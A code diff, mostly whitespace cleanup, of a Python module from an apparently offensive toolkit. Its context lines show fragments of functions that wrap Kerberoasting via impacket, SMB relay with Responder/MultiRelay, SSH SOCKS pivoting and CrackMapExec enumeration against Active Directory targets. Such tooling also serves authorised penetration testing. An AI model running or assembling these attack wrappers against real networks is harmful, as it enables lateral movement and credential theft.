@@ -4,9 +4,10 @@ Handles Kerberoasting, SMB Relay, and Automated Pivoting via SOCKS/VPN.
 """
 
 import os
-import subprocess
+
 from shadowcypher.core.logger import logger
 from shadowcypher.core.runner import runner
+
 
 class ADPivot:
     """The 'Pioneer' of the suite. Orchestrates internal lateral movement."""
@@ -19,7 +20,7 @@ class ADPivot:
         from shadowcypher.core.config import config
         project_root = str(config.project_root)
         script_path = os.path.join(project_root, "tools", "Responder", "tools", "MultiRelay", "impacket-dev", "examples", "GetUserSPNs.py")
-        
+
         if not os.path.exists(script_path):
              # Fallback to system impacket
              script_path = "impacket-GetUserSPNs"
@@ -31,7 +32,7 @@ class ADPivot:
             "-request",
             "-outputfile", output_file
         ]
-        
+
         logger.info("ad", f"kerberoast → {domain} via {dc_ip}")
         return runner.execute_task(f"KERBEROAST_{domain}", args, callback=on_output)
 
@@ -40,7 +41,7 @@ class ADPivot:
         """Launch SMB Relay attack against a target list."""
         from shadowcypher.core.config import config
         responder_path = config.get_tool_path("Responder.py")
-        
+
         # MultiRelay is usually in the same dir as Responder
         multi_relay_path = os.path.join(os.path.dirname(responder_path), "tools", "MultiRelay.py")
 
@@ -62,7 +63,7 @@ class ADPivot:
         # Pro-Choice: Default to SSH Dynamic Forwarding if possible, else Chisel
         if on_output:
             on_output(f"[PIVOT] ESTABLISHING_SOCKS5_TUNNEL_ON_PORT_{local_port}...")
-            
+
         cmd = f"ssh -D {local_port} -f -N -q {target_ip}"
         return runner.execute_task_shell(f"PIVOT_TUNNEL_{target_ip}", cmd, callback=on_output)
 
@@ -78,7 +79,7 @@ class ADPivot:
             args += ["-u", user]
         if password:
             args += ["-p", password]
-        
+
         args += ["--shares", "--users", "--groups"]
-        
+
         return runner.execute_task(f"CME_{target}", args, callback=on_output)
